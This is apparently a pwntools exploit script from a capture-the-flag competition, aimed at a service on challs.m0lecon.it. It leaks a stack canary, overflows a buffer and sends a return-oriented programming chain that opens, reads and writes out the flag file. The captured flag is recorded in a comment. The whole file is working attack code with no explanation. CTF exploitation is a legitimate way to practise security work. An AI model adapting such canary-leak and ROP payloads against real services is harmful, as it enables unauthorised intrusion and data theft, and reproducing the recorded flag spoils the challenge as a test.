# this exploit worked live during the ctf
#flag=ptm{f0rk5_ar3n7_g00d_f0r_cnr13s}

from pwn import *
target=remote('challs.m0lecon.it',9010)
#target=remote('localhost',9010)

context.terminal=["tmux","split","-h"]
#gdb.attach(target,'''break *0x40127f ''')


target.sendline("LOAD "+str(0xff-12))
canary=u64(target.recv(8))
print(hex(canary))

poprdi=0x4014f3
poprsir15=0x4014f1
writeplt=0x400b60
restart=0x40101b
ret=0x40028e
flag=0x401518
openplt=0x400c40
writeaddr=0x602f00
rdxmagic=0x401528
readplt=0x400be0

payload="EXI"+"A"*37
payload+=p64(canary)
payload+="A"*8
payload+=p64(ret)
payload+=p64(poprdi)
payload+=p64(flag)
payload+=p64(poprsir15)
payload+=p64(0)
payload+=p64(0xdeadbeefcafebabe)
payload+=p64(openplt)
payload+=p64(poprdi)
payload+=p64(3)
payload+=p64(poprsir15)
payload+=p64(writeaddr)
payload+=p64(0xdeadbeefcafebabe)
payload+=p64(rdxmagic)
payload+=p64(readplt)
payload+=p64(poprdi)
payload+=p64(4)
payload+=p64(poprsir15)
payload+=p64(writeaddr)
payload+=p64(0xdeadbeefcafebabe)
payload+=p64(writeplt)
target.sendline(payload)

target.interactive()
